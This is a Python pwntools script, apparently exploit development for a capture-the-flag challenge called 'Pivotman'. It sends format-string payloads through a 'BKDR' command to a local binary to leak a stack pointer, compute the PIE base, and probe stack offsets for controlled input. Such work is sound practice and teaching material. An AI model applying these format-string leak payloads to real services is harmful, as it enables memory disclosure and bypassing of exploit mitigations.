#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE
p.sendline(b'BKDR %2737$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
pie_leak = int(resp[idx + 6:], 16)
pie_base = pie_leak - 0x3a10
log.info(f'PIE base: {hex(pie_base)}')

# Now test position 1037 by embedding a known value there
# Use %1037$p to read what's at that position
known = 0xDEADBEEFCAFE

# Payload: BKDR + padding(?) + p64(known) + %1037$p
# The p64(known) must land at buffer offset 56 (= position 1037)
# buffer[56:64] should = p64(known)
# buffer[56] = input[53] (since input starts at buffer[3])
# So input[53:61] should = p64(known)

# Input structure: "BKDR " (5) + PADDING (48) + p64(known) (8)
# input length = 5 + 48 + 8 = 61
# input[53:61] = p64(known)
# buffer[3 + 53 : 3 + 61] = buffer[56:64] ✓

# BUT we also need a format specifier BEFORE position 1037 to read it
# The format specifier %1037$p must be BEFORE the address in the format string
# Because the address has null bytes that terminate the format string

# So: "BKDR %1037$p<padding_48_bytes><address>"
# "BKDR %1037$p" = 5 + 8 = 13 bytes
# Then padding: need 48 - 8 = 40 more bytes before address
# Wait: input[53] = address start. input = "BKDR " (5) + "%1037$p" (8) + padding (40) + p64(known) (8)
# input[13 + 40] = input[53] = address start ✓

payload = b'BKDR %1037$p' + b'.' * 40 + p64(known)
log.info(f'Payload len: {len(payload)}')
# Expected: buffer[56:64] = input[53:61] = p64(known)
# Position 1037 should contain 0xDEADBEEFCAFE

p.sendline(payload)
resp = p.recvuntil(b' \r\n')
log.info(f'Response: {resp}')
# Should see: "431136 BKDR 0xdeadbeefcafe" + garbage

# Now check position 1031 and 1032 (start of our data in input)
# Input[5] onwards is our fmt string
# input[5:13] = "%1037$p"
# buffer[8:16] = input[5:13] = "%1037$p"
# Position 1031 = buffer[8:16] = "%1037$p"
p.sendline(b'BKDR %1031$p.%1032$p')
resp = p.recvuntil(b' \r\n')
log.info(f'Positions 1031-1032: {resp}')

p.close()
